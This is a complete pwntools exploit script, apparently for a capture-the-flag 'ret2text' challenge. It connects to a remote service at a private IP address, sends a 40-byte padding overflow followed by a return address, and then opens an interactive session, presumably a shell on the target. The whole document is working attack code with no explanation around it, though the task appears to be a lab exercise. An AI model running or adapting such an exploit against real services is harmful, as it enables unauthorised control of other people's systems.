from pwn import *
#p =process("./ret2text")
p = remote("172.16.1.82",8888)
p1 = "A"*40+p64(0x400566)
p.sendline(p1)
p.interactive()
